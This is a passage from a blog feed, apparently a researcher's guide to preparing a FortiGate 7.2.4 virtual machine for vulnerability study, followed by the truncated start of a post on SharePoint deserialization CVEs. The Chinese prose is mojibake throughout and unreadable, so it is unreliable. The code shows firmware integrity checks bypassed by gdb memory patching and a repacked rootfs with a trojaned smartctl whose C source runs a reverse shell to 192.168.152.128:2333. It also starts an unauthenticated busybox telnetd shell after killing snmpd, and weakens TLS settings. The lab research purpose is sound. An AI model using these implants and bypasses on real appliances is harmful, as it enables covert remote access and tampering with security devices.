    <content type="html"><![CDATA[<h2 id="FortiGate-é•œåƒä¸‹è½½"><a href="#FortiGate-é•œåƒä¸‹è½½" class="headerlink" title="FortiGate é•œåƒä¸‹è½½"></a>FortiGate é•œåƒä¸‹è½½</h2><p>ä»å®˜ç½‘ä¸‹è½½<code>FortiGate</code>é•œåƒï¼Œç”¨<code>VMware</code>æ‰“å¼€<code>ovf</code>ï¼ˆæœ¬æ–‡æ­å»ºæ—¶ï¼Œ<code>ForiGate</code>æœ€æ–°ç‰ˆæœ¬ä¸º<code>7.2.4</code>ï¼‰</p><p>ä¼šå¾—åˆ°<code>FortiGate-disk1.vmdk</code>ã€<code>FortiGate-disk2.vmdk</code>ç­‰ä¸€äº›æ–‡ä»¶</p><h2 id="ç™»å½•"><a href="#ç™»å½•" class="headerlink" title="ç™»å½•"></a>ç™»å½•</h2><p>åœ¨è®¾ç½®è™šæ‹Ÿæœºç½‘å¡æ—¶ï¼Œçœ‹åˆ«äººéƒ½æ²¡åšä»€ä¹ˆè®¾ç½®ï¼Œæˆ‘æœ¬åœ°çš„è®¾ç½®æ˜¯<code>ç½‘ç»œé€‚é…å™¨1</code>ä¸º<code>VMnet8(NAT)</code>ã€<code>ç½‘ç»œé€‚é…å™¨2</code>ä¸º<code>VMnet0</code>ã€<code>ç½‘ç»œé€‚é…å™¨3</code>ä¸º<code>VMnet1</code></p><p>æœ€åˆç™»å½•æ—¶ç”¨<code>admin: ç©ºå¯†ç </code>ï¼Œç„¶åé€šè¿‡ä»¥ä¸‹æŒ‡ä»¤è¿›è¡Œè®¾ç½®é™æ€<code>ip</code></p><pre><code class="hljs routeros">config<span class="hljs-built_in"> system </span>interface<span class="hljs-builtin-name">edit</span> port1<span class="hljs-builtin-name">set</span> mode static<span class="hljs-builtin-name">set</span><span class="hljs-built_in"> ip </span>192.168.x.x/255.255.255.0end</code></pre><p>ç”¨<code>show system interface port1</code>æŸ¥çœ‹<code>ip</code>è®¾ç½®</p><h2 id="æŒ‚è½½-vmdk"><a href="#æŒ‚è½½-vmdk" class="headerlink" title="æŒ‚è½½ vmdk"></a>æŒ‚è½½ vmdk</h2><p>å…ˆå®‰è£…<code>libguestfs-tools</code></p><p>å†é€šè¿‡<code>sudo virt-filesystems -a FortiGate-disk1.vmdk</code>åˆ†æ<code>vmdk</code>çš„è®¾å¤‡å—ï¼Œä½†æ˜¯<code>Ubuntu20.04</code>åŠä»¥ä¸Šçš„ç‰ˆæœ¬å‡ä¼šæŠ¥å¦‚ä¸‹é”™</p><pre><code class="hljs sql">libguestfs: error: list_filesystems: sgdisk: Caution: invalid <span class="hljs-keyword">backup</span> GPT header, but valid <span class="hljs-keyword">main</span> header; regenerating<span class="hljs-keyword">backup</span> header <span class="hljs-keyword">from</span> <span class="hljs-keyword">main</span> header.<span class="hljs-keyword">Warning</span>! <span class="hljs-keyword">Main</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">backup</span> <span class="hljs-keyword">partition</span> <span class="hljs-keyword">tables</span> differ! <span class="hljs-keyword">Use</span> the <span class="hljs-string">&#x27;c&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;e&#x27;</span> options<span class="hljs-keyword">on</span> the <span class="hljs-keyword">recovery</span> &amp; transformation menu <span class="hljs-keyword">to</span> examine the two tables.<span class="hljs-keyword">Warning</span>! One <span class="hljs-keyword">or</span> more CRCs don<span class="hljs-string">&#x27;t match. You should repair the disk!</span><span class="hljs-string">Main header: OK</span><span class="hljs-string">Backup header: ERROR</span><span class="hljs-string">Main partition table: OK</span><span class="hljs-string">Backup partition table: ERROR</span><span class="hljs-string"></span><span class="hljs-string">Invalid partition data!</span></code></pre><p>å¦‚æœç”¨<code>Ubuntu18.04</code>ä¸ä¼šæŠ¥é”™ï¼Œåº”è¯¥ä»…æ˜¯<code>backup GPT header</code>ä¸å¯¹ï¼Œç”¨<code>Ubuntu18.04</code>å¯ä»¥çœ‹åˆ°å…¶è®¾å¤‡å—ä¸º<code>/dev/sda1 /dev/sda2 /dev/sda3</code></p><p>ä¸ç”¨æŸ¥çœ‹è®¾å¤‡å—ï¼Œç›´æ¥æŒ‚è½½<code>/dev/sda1</code>ä¹Ÿå¯ï¼Œè¿™é‡Œçš„<code>-m</code>æ˜¯æŒ‡çš„<code>vmdk</code>ä¸­çš„è®¾å¤‡å—ï¼Œä¼šæŒ‚è½½åˆ°å½“å‰ç›®å½•çš„<code>FortiGate</code>ç›®å½•ä¸­</p><pre><code class="hljs haml">sudo guestmount -a FortiGate-disk1.vmdk -m /dev/sda1 --rw ./FortiGateUsage:  guestmount [--options] mountpointOptions:  -<span class="ruby">a<span class="hljs-params">|--add image       Add image</span></span><span class="ruby">  -m<span class="hljs-params">|--mount dev[:mnt[:opts[:fstype]] Mount dev on mnt (<span class="hljs-keyword">if</span> omitted, /)</span></span><span class="ruby">  -w<span class="hljs-params">|--rw              Mount read-write</span></span></code></pre><p>æŒ‚è½½ä¹‹åï¼Œå¯å¾—åˆ°å¦‚ä¸‹ç›®å½•</p><pre><code class="hljs css"><span class="hljs-selector-tag">bin</span>   <span class="hljs-selector-tag">boot</span><span class="hljs-selector-class">.msg</span>  <span class="hljs-selector-tag">config</span>         <span class="hljs-selector-tag">dhcpddb</span><span class="hljs-selector-class">.bak</span>         <span class="hljs-selector-tag">etc</span>            <span class="hljs-selector-tag">filechecksum</span>  <span class="hljs-selector-tag">flatkc</span><span class="hljs-selector-class">.chk</span>   <span class="hljs-selector-tag">ldlinux</span><span class="hljs-selector-class">.sys</span>  <span class="hljs-selector-tag">log</span>         <span class="hljs-selector-tag">rootfs</span><span class="hljs-selector-class">.gz</span><span class="hljs-selector-tag">boot</span>  <span class="hljs-selector-tag">cmdb</span>      <span class="hljs-selector-tag">dhcp6s_db</span><span class="hljs-selector-class">.bak</span>  <span class="hljs-selector-tag">dhcp_ipmac</span><span class="hljs-selector-class">.dat</span><span class="hljs-selector-class">.bak</span>  <span class="hljs-selector-tag">extlinux</span><span class="hljs-selector-class">.conf</span>  <span class="hljs-selector-tag">flatkc</span>        <span class="hljs-selector-tag">ldlinux</span><span class="hljs-selector-class">.c32</span>  <span class="hljs-selector-tag">lib</span>          <span class="hljs-selector-tag">lost</span>+<span class="hljs-selector-tag">found</span>  <span class="hljs-selector-tag">rootfs</span><span class="hljs-selector-class">.gz</span><span class="hljs-selector-class">.chk</span></code></pre><p>å…¶ä¸­æ¯”è¾ƒé‡è¦å°±æ˜¯<code>exlinux.conf</code>ã€<code>flatkc</code>ã€<code>flatkc.chk</code>ã€<code>rootfs.gz</code>ã€<code>rootfs.gz.chk</code></p><pre><code class="hljs routeros">vangelis@0x13:~/Desktop$ cat ./FortiGate-backup/extlinux.conf DISPLAY boot.msgTIMEOUT 10TOTALTIMEOUT 9000DEFAULT flatkc ro <span class="hljs-attribute">panic</span>=5 <span class="hljs-attribute">endbase</span>=0xA0000 <span class="hljs-attribute">console</span>=ttyS0, <span class="hljs-attribute">root</span>=/dev/ram0 <span class="hljs-attribute">ramdisk_size</span>=65536 <span class="hljs-attribute">initrd</span>=/rootfs.gz <span class="hljs-attribute">maxcpus</span>=1 <span class="hljs-attribute">mem</span>=2048Mvangelis@0x13:~/Desktop$ file ./flatkc./flatkc: Linux kernel x86 boot executable bzImage, version 4.19.13 (root@build) #1 SMP Tue Jan 31 05:32:20 UTC 2023, RO-rootFS, swap_dev 0x6, Normal VGA</code></pre><h3 id="flatkc"><a href="#flatkc" class="headerlink" title="flatkc"></a>flatkc</h3><p>ä½¿ç”¨<a href="https://github.com/marin-m/vmlinux-to-elf">vmlinux-to-elf</a>å°†<code>bzImage</code>è½¬æˆ<code>elf</code>ï¼Œå…¶ä¸»è¦åœ¨<code>fgt_verify</code>ä¸­æ£€æŸ¥<code>/sbin/init</code>å’Œ<code>/sbin/init.chk</code>æ˜¯å¦åŒ¹é…ï¼Œåªè¦ä¿®æ”¹<code>fgt_verify()</code>çš„è¿”å›å€¼å°±å¯ä»¥ç»•è¿‡æ£€æµ‹ï¼Œèµ°åˆ°<code>do_execve(&quot;/sbin/init&quot;)</code></p><p>P.S è°ƒè¯•æ—¶çœ‹åˆ°çš„<code>rootfs.gz</code>åº”è¯¥æ˜¯åœ¨<code>kernel_init_freeable</code>ä¸­è°ƒç”¨<code>unpack_rootfs</code></p><p><img src="/img/FortiGate-Setup-7.2.4/flatkc-kernel-init.png" alt="flatkc-kernel-init"></p><h3 id="sbin-init"><a href="#sbin-init" class="headerlink" title="/sbin/init"></a>/sbin/init</h3><p>ä¸»è¦<code>verify_filesystem</code>ä¸­éªŒè¯æ‰€æœ‰çš„æ–‡ä»¶ç³»ç»Ÿï¼Œåé¢è§£å‹<code>bin</code>ã€<code>migadmin</code>ã€<code>node-scripts</code>ã€<code>usr</code>ï¼Œå†<code>execve(&quot;/bin/init&quot;)</code></p><p><img src="/img/FortiGate-Setup-7.2.4/sbin-init.png" alt="sbin-init"></p><p>åœ¨<code>verify-filesystem</code>ä¸­<code>sub_401700</code>éå†æ‰€æœ‰çš„æ–‡ä»¶ç³»ç»Ÿï¼Œç„¶åç®—<code>hash</code>ï¼Œæœ€åè·Ÿ<code>.fgtsum</code>çš„ç»“æœæ¯”è¾ƒ</p><p><img src="/img/FortiGate-Setup-7.2.4/verify-filesystem.png" alt="verify-filesystem"></p><h3 id="bin-init"><a href="#bin-init" class="headerlink" title="/bin/init"></a>/bin/init</h3><p><code>/bin/init</code>æ˜¯<code>FortiGate</code>ä¸­æ ¸å¿ƒåŠŸèƒ½ï¼Œå‡ ä¹æ‰€æœ‰çš„åå°è¿è¡Œçš„ç¨‹åºå‡é“¾æ¥åˆ°<code>/bin/init</code>ï¼Œåœ¨<code>main</code>ä¸­å­˜åœ¨ä¸€äº›æ£€æµ‹</p><p><img src="/img/FortiGate-Setup-7.2.4/bin-init-main.png" alt="bin-init-main"></p><p>åœ¨<code>verifyKernelAndRootfs_450510()</code>çš„åœ°æ–¹ä¼šéªŒè¯<code>flatkc</code>å’Œ<code>rootfs</code>æ–‡ä»¶ç›®å½•çš„ç»“æœ</p><h2 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h2><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>æœ€å¼€å§‹æƒ³çš„æ˜¯ï¼Œç›´æ¥åˆ©ç”¨é‡æ‰“åŒ…<code>rootfs.gz</code>ï¼ˆæ³¨ï¼šè¿™é‡Œ<code>/dev/sda1</code>æ¯”è¾ƒå°ï¼Œéœ€è¦æ”¾åˆ°å¤–é¢å†é‡æ‰“åŒ…ï¼‰ï¼Œè°ƒè¯•è™šæ‹Ÿæœºå†…æ ¸æ—¶ä¿®æ”¹<code>flatkc</code>ä¸­çš„æŒ‡å‘<code>/sbin/init</code>çš„å­—ç¬¦ä¸²ä¸º<code>/sh</code>ï¼Œä»è€Œç›´æ¥æ‰§è¡Œ<code>busybox</code>çš„<code>sh</code>ï¼Œç»“æœä¸æˆåŠŸï¼Œå¯èƒ½æ˜¯<code>/bin/init</code>ä¸­å¯¹äºä¸€äº›è®¾å¤‡è¿›è¡Œäº†åˆå§‹åŒ–</p><p>äºæ˜¯è¿˜æ˜¯å¾—æŒ‰ç…§åˆ«äººåšå®¢ä¸­çš„æ€è·¯ï¼Œé‡æ‰“åŒ…<code>rootfs.gz</code>ï¼Œè‡ªå·±å®ç°<code>/sbin/init</code>å¹²çš„äº‹æƒ…å³è§£å‹æ–‡ä»¶ï¼Œå¹¶æŠŠ<code>/bin/busybox</code>ä¸¢è¿›å»ï¼›åœ¨è°ƒè¯•å†…æ ¸çš„æ—¶å€™ï¼Œä¿®æ”¹<code>flatkc</code>çš„æ ¡éªŒï¼Œä½¿å…¶ä¸<code>panic</code>ä¸”ä¿®æ”¹å…¶æŒ‡å‘çš„å­—ç¬¦ä¸²ä¸º<code>/bin/init</code>ï¼›æ‰§è¡Œ<code>/bin/init</code>æ—¶ä¿®æ”¹éªŒè¯çš„è¿”å›å€¼ï¼Œä½¿å…¶æ­£å¸¸è¿‡æ£€æµ‹</p><p>åœ¨é‡æ‰“åŒ…<code>rootfs.gz</code>çš„æ—¶å€™ï¼Œä¿®æ”¹<code>rootfs</code>ä¸­çš„<code>smartctl</code>çš„é€»è¾‘ï¼Œé€šè¿‡ <a href="https://github.com/leommxj/prebuilt-multiarch-bin/blob/bin/x86_64_tools/reverse_shell">reverse_shell</a> åå¼¹<code>shell</code>ï¼Œç„¶åé€šè¿‡<code>diagnose hardware smartctl</code>æŒ‡ä»¤è¿›è¡Œæ‰§è¡Œ<code>smartctl</code></p><pre><code class="hljs c"><span class="hljs-comment">// gcc ./smartctl.c -static -o ./smartctl</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">shell</span><span class="hljs-params">()</span></span>&#123;    system(<span class="hljs-string">&quot;/bin/busybox ls&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);    system(<span class="hljs-string">&quot;/bin/busybox id&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);    system(<span class="hljs-string">&quot;/bin/reverse_shell 192.168.152.128 2333 &amp;&amp; /bin/busybox id&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);    <span class="hljs-keyword">return</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> *argv[])</span></span><span class="hljs-function"></span>&#123;    shell();    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h3 id="æ“ä½œ"><a href="#æ“ä½œ" class="headerlink" title="æ“ä½œ"></a>æ“ä½œ</h3><p>é¦–å…ˆç»™è™šæ‹Ÿæœºçš„<code>vmx</code>åŠ ä¸Šå¦‚ä¸‹è¯­å¥ï¼Œåˆ©ç”¨<code>debugStub</code>çš„ç‰¹æ€§å¯¹è™šæ‹Ÿæœºè¿›è¡Œè°ƒè¯•ï¼Œä½†æ˜¯è¿™ä¸ªåœ°æ–¹æœ‰ä¸ªå‘ï¼Œå°±æ˜¯å¦‚æœç”¨äº†<code>windows hyperV</code>å°±ä¼šåœ¨è°ƒè¯•çš„æ—¶å€™è·‘é£ï¼Œå®Œå…¨æ–­ä¸ä¸‹æ¥ï¼Œ<a href="https://communities.vmware.com/t5/VMware-Workstation-Pro/debugStub-does-not-work-on-Windows-10-2004-with-Hyper-V/td-p/1868359">debugStub does not work on Windows 10 2004 with Hyper-V</a></p><pre><code class="hljs ini"><span class="hljs-attr">debugStub.listen.guest64</span> = <span class="hljs-string">&quot;TRUE&quot;</span><span class="hljs-attr">debugStub.listen.guest64.remote</span> = <span class="hljs-string">&quot;TRUE&quot;</span><span class="hljs-attr">debugStub.port.guest64</span> = <span class="hljs-string">&quot;12345&quot;</span><span class="hljs-attr">debugStub.listen.guest32</span> = <span class="hljs-string">&quot;TRUE&quot;</span><span class="hljs-attr">debugStub.listen.guest32.remote</span> = <span class="hljs-string">&quot;TRUE&quot;</span><span class="hljs-attr">debugStub.port.guest32</span> = <span class="hljs-string">&quot;12346&quot;</span><span class="hljs-attr">toolsInstallManager.updateCounter</span> = <span class="hljs-string">&quot;2&quot;</span><span class="hljs-attr">tools.remindInstall</span> = <span class="hljs-string">&quot;FALSE&quot;</span></code></pre><p>è§£å‹<code>rootfs</code>ï¼Œç›´æ¥ç”¨<code>cpio -idmv &lt; ../rootfs</code></p><p>è§£å‹çš„æ—¶å€™<code>xz</code>ä¸ºå…¶è‡ªå·±å®ç°çš„ï¼Œå› æ­¤è¦ç”¨å¦‚ä¸‹æŒ‡ä»¤ï¼Œå°†å‹ç¼©çš„å…¨éƒ¨è§£å‹</p><pre><code class="hljs awk">chroot . <span class="hljs-regexp">/sbin/</span>xz -d usr.tar.xzchroot . <span class="hljs-regexp">/sbin/</span>ftar -xf ./usr.tar</code></pre><p>é‡æ‰“åŒ…çš„æŒ‡ä»¤å¦‚ä¸‹</p><pre><code class="hljs jboss-cli">find . | cpio -o <span class="hljs-params">--format=newc</span> &gt; rootfs gzip rootfsguestmount -a FortiGate-disk1.vmdk -m <span class="hljs-string">/dev/sda1</span> <span class="hljs-params">--rw</span> <span class="hljs-string">./FortiGate</span> <span class="hljs-keyword">cd</span> FortiGatecp <span class="hljs-string">../xxx/rootfs.gz</span> <span class="hljs-string">./</span><span class="hljs-keyword">cd</span> <span class="hljs-string">..</span>umount FortiGate</code></pre><p>åœ¨å¼€å¯<code>FortiGate</code>ä¹‹åå‡ºç°å¦‚ä¸‹å­—æ ·åï¼Œè¿›è¡Œè¿œç¨‹è°ƒè¯•ï¼Œæ–­åœ¨<code>fgt_verify()</code>çš„è¿”å›ï¼Œä¿®æ”¹å…¶è¿”å›å€¼ï¼Œå¹¶ä¿®æ”¹å…¶å­—ç¬¦ä¸²ä¸º<code>/bin/init\x00</code>ï¼Œç„¶åå†åœ¨<code>/bin/init</code>ä¸­ä¸‹æ–­ç‚¹ï¼ˆå…¶å®è¿™ä¸ªåœ°æ–¹ï¼Œä»å†…æ ¸å±‚é¢ç»™ç”¨æˆ·æ€çš„ä¸€ä¸ªè¿›ç¨‹ä¸‹æ–­ç‚¹ï¼Œæ²¡å¤ªææ‡‚ï¼‰ï¼Œä¿®æ”¹è¿”å›å€¼ï¼Œå°±å¯ä»¥æˆåŠŸç»•è¿‡æ£€æµ‹äº†</p><p>å»ºè®®ä½¿ç”¨è£¸<code>gdb</code></p><pre><code class="hljs erlang-repl">Loading flatkc... okLoading rootfs.gz... ok</code></pre><p>ä»¥ä¸‹æ˜¯å†™çš„ä¸€ä¸ª<code>script</code>ï¼ˆæ³¨æ„è¿™é‡Œ<code>debugStub</code>èµ·çš„æ˜¯ä¸»æœºçš„ç«¯å£ï¼‰</p><pre><code class="hljs apache"><span class="hljs-attribute">file</span> ./flatkc-elf<span class="hljs-attribute">target</span> remote <span class="hljs-number">192.168.152.1:12345</span><span class="hljs-attribute">b</span> *<span class="hljs-number">0</span>xffffffff<span class="hljs-number">80</span>c<span class="hljs-number">022</span>db<span class="hljs-comment"># b *0xffffffff80c0231a</span><span class="hljs-attribute">b</span> *<span class="hljs-number">0</span>x<span class="hljs-number">452</span>BAC<span class="hljs-attribute">b</span> *<span class="hljs-number">0</span>x<span class="hljs-number">452</span>DF<span class="hljs-number">3</span> <span class="hljs-attribute">b</span> *<span class="hljs-number">0</span>x<span class="hljs-number">452</span>BC<span class="hljs-number">6</span><span class="hljs-attribute">c</span><span class="hljs-attribute">define</span> context  <span class="hljs-attribute">i</span> r  <span class="hljs-attribute">x</span>/<span class="hljs-number">10</span>i $pc<span class="hljs-attribute">end</span><span class="hljs-attribute">define</span> bypass   <span class="hljs-attribute">set</span> $rax=<span class="hljs-number">0</span>   <span class="hljs-attribute">patch</span>   <span class="hljs-attribute">c</span><span class="hljs-attribute">end</span><span class="hljs-attribute">define</span> patch  <span class="hljs-attribute">context</span>  <span class="hljs-attribute">set</span> *(char*)<span class="hljs-number">0</span>xFFFFFFFF<span class="hljs-number">813</span>B<span class="hljs-number">779</span>D=&#x27;b&#x27;  <span class="hljs-attribute">set</span> *(char*)<span class="hljs-number">0</span>xFFFFFFFF<span class="hljs-number">813</span>B<span class="hljs-number">779</span>E=&#x27;i&#x27;  <span class="hljs-attribute">set</span> *(char*)<span class="hljs-number">0</span>xFFFFFFFF<span class="hljs-number">813</span>B<span class="hljs-number">779</span>F=&#x27;n&#x27;  <span class="hljs-attribute">set</span> *(char*)<span class="hljs-number">0</span>xFFFFFFFF<span class="hljs-number">813</span>B<span class="hljs-number">77</span>A<span class="hljs-number">0</span>=&#x27;/&#x27;  <span class="hljs-attribute">set</span> *(char*)<span class="hljs-number">0</span>xFFFFFFFF<span class="hljs-number">813</span>B<span class="hljs-number">77</span>A<span class="hljs-number">1</span>=&#x27;i&#x27;  <span class="hljs-attribute">set</span> *(char*)<span class="hljs-number">0</span>xFFFFFFFF<span class="hljs-number">813</span>B<span class="hljs-number">77</span>A<span class="hljs-number">2</span>=&#x27;n&#x27;  <span class="hljs-attribute">set</span> *(char*)<span class="hljs-number">0</span>xFFFFFFFF<span class="hljs-number">813</span>B<span class="hljs-number">77</span>A<span class="hljs-number">3</span>=&#x27;i&#x27;  <span class="hljs-attribute">set</span> *(char*)<span class="hljs-number">0</span>xFFFFFFFF<span class="hljs-number">813</span>B<span class="hljs-number">77</span>A<span class="hljs-number">4</span>=&#x27;t&#x27;  <span class="hljs-attribute">set</span> *(char*)<span class="hljs-number">0</span>xFFFFFFFF<span class="hljs-number">813</span>B<span class="hljs-number">77</span>A<span class="hljs-number">5</span>=&#x27;\x<span class="hljs-number">00</span>&#x27;  <span class="hljs-attribute">x</span>/s <span class="hljs-number">0</span>xFFFFFFFF<span class="hljs-number">813</span>B<span class="hljs-number">779</span>C<span class="hljs-attribute">end</span></code></pre><h2 id="å¼€å¯telnetd"><a href="#å¼€å¯telnetd" class="headerlink" title="å¼€å¯telnetd"></a>å¼€å¯telnetd</h2><p>åœ¨å¼€å¯<code>telnetd</code>çš„åœ°æ–¹ï¼Œåœ¨<code>7.2.4</code>çš„ç‰ˆæœ¬ä¸Šï¼Œåº”è¯¥å­˜åœ¨è¾ƒå¤§çš„æ”¹åŠ¨ï¼Œ<code>killall -9 sshd</code>ä¹‹åä¼šç«‹åˆ»é‡å¯ï¼ŒåŸºæœ¬ä¸Šæ²¡æˆåŠŸçš„ç”¨<code>telnetd</code>å ä¸Š<code>22</code>ç«¯å£ï¼Œå…¶ä»–çš„ç«¯å£ä¹Ÿè¢«å¢™äº†ï¼Œæœ€ååœ¨<code>ZOE</code>å¤§ä½¬çš„å¸®åŠ©ä¸‹ï¼Œåˆ©ç”¨å¼€å¯<code>snmp</code>æœåŠ¡ï¼Œç„¶åå‘ç°å¹¶æ²¡æœ‰æ£€æµ‹<code>kill snmpd</code>ï¼Œå› æ­¤å¯ä»¥ç›´æ¥åˆ©ç”¨<code>snmp</code>è¢«<code>kill</code>æ‰çš„<code>161</code>å’Œ<code>162</code>ç«¯å£ï¼Œè¿›è¡Œå¼€å¯<code>telnet</code>å’Œ<code>gdbserver</code>è½¬å‘</p><p>å°±æ˜¯åœ¨<code>Network/interfaces</code>ä¸­ï¼Œä¿®æ”¹<code>port1</code>ï¼ŒæŠŠ<code>snmp</code>æ‰“å¼€</p><pre><code class="hljs angelscript">killall <span class="hljs-number">-9</span> snmpd &amp;&amp; /bin/busybox telnetd -l /bin/sh -b <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> -p <span class="hljs-number">162</span>/bin/gdbserver --attach <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">161</span> sslvpndPid</code></pre><p>å¦‚æœé€†å‘åˆ°åé¢ï¼Œå¯ä»¥æ‰¾åˆ°<code>/bin/init</code>ä¸­çš„<code>sshd</code>çš„<code>Service</code>æ³¨å†Œçš„ä½ç½®ï¼ŒæŠŠæ³¨å†Œçš„ä½ç½®æ”¹æˆ<code>while(1)</code>ï¼ŒåŒæ ·ä¹Ÿæ˜¯å¯ä»¥<code>kill sshd</code>ï¼Œå ç”¨<code>22</code>ç«¯å£å¼€å¯<code>telnetd</code>æœåŠ¡çš„</p><h2 id="é…ç½®ip"><a href="#é…ç½®ip" class="headerlink" title="é…ç½®ip"></a>é…ç½®ip</h2><p><a href="https://help.fortinet.com/fdb/5-0-0/html/source/tasks/t_network_configuration_cli.html">å®˜æ–¹æ–‡æ¡£</a></p><pre><code class="hljs routeros">config<span class="hljs-built_in"> system </span>interface  <span class="hljs-builtin-name">edit</span> &lt;port&gt;  <span class="hljs-builtin-name">set</span><span class="hljs-built_in"> ip </span>&lt;ip_address&gt; &lt;netmask&gt;  <span class="hljs-builtin-name">set</span> allowaccess (http https<span class="hljs-built_in"> ping </span>ssh telnet)end</code></pre><h2 id="python3-tlsv1-æŠ¥é”™"><a href="#python3-tlsv1-æŠ¥é”™" class="headerlink" title="python3 tlsv1 æŠ¥é”™"></a>python3 tlsv1 æŠ¥é”™</h2><p>ç”¨<code>python3</code>å†™<code>SSL</code>è¿æ¥æ—¶æŠ¥é”™å¦‚ä¸‹</p><pre><code class="hljs stata">  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;/usr/lib/python3.8/ssl.py&quot;</span>, <span class="hljs-keyword">line</span> 500, <span class="hljs-keyword">in</span> wrap_socket    <span class="hljs-keyword">return</span> self.sslsocket_class._create(  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;/usr/lib/python3.8/ssl.py&quot;</span>, <span class="hljs-keyword">line</span> 1040, <span class="hljs-keyword">in</span> _create    self.do_handshake()  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;/usr/lib/python3.8/ssl.py&quot;</span>, <span class="hljs-keyword">line</span> 1309, <span class="hljs-keyword">in</span> do_handshake    self._sslobj.do_handshake()ssl.SSLError: [SSL: TLSV1_ALERT_PROTOCOL_VERSION] tlsv1 alert protocol <span class="hljs-keyword">version</span> (_ssl.c:1131)</code></pre><p>æ˜¯å› ä¸º<code>ubuntu 20.04</code>æœ€ä½çš„<code>tls</code>ç‰ˆæœ¬è®¾ç½®é«˜äº<code>tlsv1</code>ï¼Œå› æ­¤éœ€è¦ä¿®æ”¹<code>/etc/ssl/openssl.cnf</code>çš„é…ç½®</p><p>éœ€è¦åœ¨æ–‡ä»¶ç¬¬ä¸€è¡ŒåŠ ä¸Š<code>openssl_conf = default_conf</code></p><p>æ–‡ä»¶å°¾å†åŠ ä¸Š</p><pre><code class="hljs ini"><span class="hljs-section">[default_conf]</span><span class="hljs-attr">ssl_conf</span> = ssl_sect<span class="hljs-section">[ssl_sect]</span><span class="hljs-attr">system_default</span> = system_default_sect<span class="hljs-section">[system_default_sect]</span><span class="hljs-attr">MinProtocol</span> = TLSv1<span class="hljs-attr">CipherString</span> = DEFAULT@SECLEVEL=<span class="hljs-number">1</span></code></pre><p>å¦‚æœæƒ³è¦<code>requests</code>ä¸æŠ¥<code>warning</code>ï¼Œéœ€è¦åŠ ä¸Šå¦‚ä¸‹ä»£ç åœ¨<code>python3</code>è„šæœ¬ä¸­</p><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> urllib3.exceptions import InsecureRequestWarningrequests.packages.urllib3.disable_warnings(<span class="hljs-attribute">category</span>=InsecureRequestWarning)</code></pre><p>è¿™éƒ¨åˆ†çš„æŠ¥é”™è§£å†³å¾ˆä¹…ï¼Œæœ€åæ˜¯åœ¨<a href="https://blog.csdn.net/weixin_44338780/article/details/117912301">ubuntu 20.04å¯ç”¨TLSv1</a>æ‰¾åˆ°çš„</p><h2 id="å¼•ç”¨"><a href="#å¼•ç”¨" class="headerlink" title="å¼•ç”¨"></a>å¼•ç”¨</h2><blockquote><p><a href="https://forum.butian.net/share/2166">https://forum.butian.net/share/2166</a><br><a href="https://wzt.ac.cn/2022/12/15/CVE-2022-42475/">https://wzt.ac.cn/2022/12/15/CVE-2022-42475/</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>setup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>FortiGate</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-22005 CVE-2022-29108 æ¼æ´å¤ç°</title>
    <link href="/2023/04/05/CVE-2022-22005%20CVE-2022-29108%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/04/05/CVE-2022-22005%20CVE-2022-29108%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2022-22005-CVE-2022-29108-æ¼æ´å¤ç°"><a href="#CVE-2022-22005-CVE-2022-29108-æ¼æ´å¤ç°" class="headerlink" title="CVE-2022-22005 CVE-2022-29108 æ¼æ´å¤ç°"></a>CVE-2022-22005 CVE-2022-29108 æ¼æ´å¤ç°</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p><code>CVE-2022-22005</code>å’Œ<code>CVE-2022-29108</code>éƒ½æ˜¯<code>BinaryFormatter.Deserialize()</code>æ—¶å€™æ²¡å¯¹éœ€è¦ååºåˆ—åŒ–çš„å†…å®¹ç±»å‹è¿›è¡Œè®¾ç½®ï¼Œä»è€Œå¯¼è‡´ååºåˆ—åŒ–æ¼æ´</p><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><p>ç¯å¢ƒé…ç½®è¸©äº†å¾ˆå¤šå‘</p><h3 id="InfoPath"><a href="#InfoPath" class="headerlink" title="InfoPath"></a>InfoPath</h3><p><code>InfoPath</code>ä¸<code>SharePoint Server</code>ç›¸è¿æ—¶ï¼ˆä½¿ç”¨<code>InfoPath Designer</code>ï¼Œé€‰æ‹©<code>SharePoint List</code>ï¼‰</p><ol><li><code>SharePoint 